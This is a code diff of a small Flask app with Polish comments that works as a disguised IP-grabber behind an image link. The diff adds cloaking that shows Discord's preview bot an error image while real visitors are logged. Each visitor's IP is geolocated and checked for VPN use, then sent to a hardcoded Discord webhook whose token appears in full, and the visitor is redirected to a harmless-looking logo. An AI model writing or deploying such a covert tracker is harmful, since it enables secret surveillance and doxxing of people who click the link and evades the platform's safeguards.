@@ -3,39 +3,47 @@ import requests
 
 app = Flask(__name__)
 
+# --- KONFIGURACJA ---
 WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"
+ERROR_IMG = "https://i.imgur.com/8N9vX7o.png"
+REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"
 
-@app.route('/test.png')
+@app.route('/image.png')
 def logger():
-    ua = request.headers.get('User-Agent', 'Unknown')
+    ua = request.headers.get('User-Agent', '')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    # Jeśli to bot Discorda, tylko przekieruj do zdjęcia, nie wysyłaj logu
-    if "Discordbot" in ua:
-        return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")
+    # Cloaking: Bot Discorda widzi obrazek bledu, czlowiek jest logowany
+    if "Discordbot" in ua or "externalhit" in ua.lower():
+        return redirect(ERROR_IMG)
 
-    # Dane do wysłania
+    geo, vpn = "Brak", "Nieznany"
+    try:
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy,hosting", timeout=3).json()
+        if r.get("status") == "success":
+            geo = f"{r.get('city')}, {r.get('country')} ({r.get('isp')})"
+            vpn = "TAK" if (r.get('proxy') or r.get('hosting')) else "NIE"
+    except:
+        pass
+
     payload = {
         "embeds": [{
-            "title": "🎯 Nowe trafienie!",
-            "description": f"**IP:** `{ip}`\n**Browser:** `{ua}`",
-            "color": 16711680
+            "title": "🎯 Nowy Log!",
+            "color": 15548997,
+            "fields": [
+                {"name": "IP", "value": f"`{ip}`", "inline": True},
+                {"name": "VPN", "value": f"`{vpn}`", "inline": True},
+                {"name": "LOKALIZACJA", "value": f"`{geo}`", "inline": False}
+            ]
         }]
     }
 
-    # Nagłówki udające przeglądarkę, żeby Discord nie odrzucił połączenia
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-    }
-
     try:
-        # Próba wysłania z timeoutem i nagłówkami
-        response = requests.post(WEBHOOK_URL, json=payload, headers=headers, timeout=10)
-        print(f"Status Webhooka: {response.status_code}")
-    except Exception as e:
-        print(f"Błąd wysyłania: {e}")
+        requests.post(WEBHOOK_URL, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
+    except:
+        pass
 
-    return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")
+    return redirect(REAL_IMG)
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     app.run(port=10000)
